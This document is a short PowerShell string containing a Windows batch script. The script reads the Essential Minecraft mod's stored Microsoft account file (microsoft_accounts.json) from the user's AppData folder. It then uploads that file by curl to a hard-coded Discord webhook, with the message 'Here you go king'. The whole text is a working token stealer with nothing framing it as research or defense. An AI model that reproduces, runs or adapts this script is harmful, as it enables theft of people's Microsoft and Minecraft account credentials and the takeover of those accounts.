$batchContent = @"
@echo off
setlocal enabledelayedexpansion

:: Discord Webhook URL
set webhookUrl=https://discord.com/api/webhooks/1358322214012850186/6CudWFZNnkk25HhvN3uObmfP6_LFBdPD6lzimwkZNkyERaxXeVXq1Pi4UcYfQ_BSVwUr

:: Path to the accounts.json file
set filePath=%USERPROFILE%\AppData\Roaming\gg.essential.mod\microsoft_accounts.json

:: Check if the file exists
if not exist "%filePath%" (
    echo File accounts.json does not exist at the specified path.
    goto :end
)

:: Prepare message
set message=Here you go king :pray:

:: Correcting the payload format
set payload={\"content\":\"%message%\"}

:: Escape the payload for the curl request
set payload_json={\"content\":\"%message%\"}

:: Prepare CURL command for sending the request
curl -X POST %webhookUrl% ^
     -H "Content-Type: multipart/form-data" ^
     -F "payload_json=%payload_json%" ^
     -F "file=@%filePath%" 

if %errorlevel% neq 0 (
    echo Failed to send the webhook request.
) else (
    echo File sent successfully!
)

:end
pause >nul
endlocal
"@
